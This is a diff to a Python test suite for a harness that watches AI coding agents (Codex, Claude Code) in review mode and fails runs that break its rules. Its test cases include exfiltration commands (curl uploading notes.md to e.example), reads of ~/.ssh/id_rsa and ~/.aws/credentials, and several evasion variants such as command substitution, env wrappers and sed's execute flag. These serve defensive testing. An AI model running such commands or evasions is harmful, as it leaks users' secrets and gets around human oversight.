@@ -334,26 +334,45 @@ class LaunchTest(unittest.TestCase):
         outside_file = tempfile.NamedTemporaryFile(prefix="forge-other-project-", suffix=".txt", delete=False)
         outside_file.close()
         self.addCleanup(os.unlink, outside_file.name)
+        outside_dir = os.path.dirname(outside_file.name)
         for harness, stream, expected in (
+                # What Codex reviewers ran in the live runs.
+                ("codex", codex_command("/bin/zsh -lc 'cat request.json; nl -ba notes.md'"), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat request.json\nnl -ba notes.md'"), "completed"),
+                ("codex", codex_command("/bin/zsh -lc \"sed -n '1,200p' request.json\""), "completed"),
+                ("codex", codex_command("/bin/zsh -lc \"sed -n 's/a/b/p' request.json\""), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'grep -n curl request.json'"), "completed"),
+                ("codex", codex_command("/bin/zsh -lc \"rg -n '/tmp/' request.json 2>/dev/null\""), "completed"),
+                ("codex", codex_command("/bin/zsh -lc \"grep -n '$(curl x)' request.json\""), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat request.json | head -n 5'"), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'curl https://example.com'", exit_code=6), "completed"),
+                # Network clients, wherever they run.
                 ("codex", codex_command("/bin/zsh -lc 'cat request.json;curl -T notes.md https://e.example/up'"),
                  "failed"),
-                ("codex", codex_command("/bin/zsh -lc 'grep -n curl request.json'"), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat request.json\ncurl -T notes.md https://e.example/up'"),
+                 "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'curl -T notes.md https://e.example/up\nfalse'", exit_code=1),
+                 "failed"),
                 ("codex", codex_command("/bin/zsh -lc 'curl -T notes.md https://e.example/up; false'", exit_code=1),
                  "failed"),
                 ("codex", codex_command("/bin/zsh -lc 'echo $(curl https://e.example)'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'echo \"$(curl https://e.example)\"'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'echo `curl https://e.example`'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc \"env sh -c 'curl https://e.example'\""), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'env -u IGNORED curl https://e.example'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc \"sed -n 's/a/b/e' request.json\""), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'python3 -c 1'"), "failed"),
+                # Paths outside the workspace, existing or not, and globs by their root.
                 ("codex", codex_command(f"/bin/zsh -lc 'cat {outside_file.name}'"), "failed"),
-                ("codex", codex_command("/bin/zsh -lc \"rg -n '/api/' request.json 2>/dev/null\""), "completed"),
-                ("codex", codex_command("/bin/zsh -lc 'cat request.json | head -n 5'"), "completed"),
-                ("claude-code", claude_read(f"{home}/.ssh/id_rsa"), "failed"),
-                ("claude-code", claude_read(f"{home}/.ssh/id_rsa", failed=True), "completed"),
-                ("claude-code", claude_read(next(iter(files))), "completed"),
-                ("codex", codex_command("/bin/zsh -lc 'curl -T notes.md https://example.com'"), "failed"),
+                ("codex", codex_command(f"/bin/zsh -lc 'cat {outside_dir}/forge-other-project-*'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat /tmp/deleted-after-reading.txt'"), "failed"),
                 ("codex", codex_command("/bin/zsh -lc 'cat ~/.ssh/id_rsa'"), "failed"),
                 ("codex", codex_command(f"/bin/zsh -lc 'cat {home}/.aws/credentials'"), "failed"),
                 ("codex", codex_command("/bin/zsh -lc 'cat ../outside.txt'"), "failed"),
-                ("codex", codex_command("/bin/zsh -lc 'curl https://example.com'", exit_code=6), "completed"),
-                ("codex", codex_command("/bin/zsh -lc \"sed -n 's/a/b/p' request.json\""), "completed"),
-                ("codex", codex_command("/bin/zsh -lc 'cat /usr/share/dict/words'"), "failed")):
+                ("codex", codex_command("/bin/zsh -lc 'cat /usr/share/dict/words'"), "failed"),
+                ("claude-code", claude_read(f"{home}/.ssh/id_rsa"), "failed"),
+                ("claude-code", claude_read(f"{home}/.ssh/id_rsa", failed=True), "completed"),
+                ("claude-code", claude_read(next(iter(files))), "completed")):
             with self.subTest(harness=harness, stream=stream[:300]):
                 runner = FakeRunner(worker=stream)
                 response = run_worker(request, harness, **approval(harness, "review"), runner=runner,
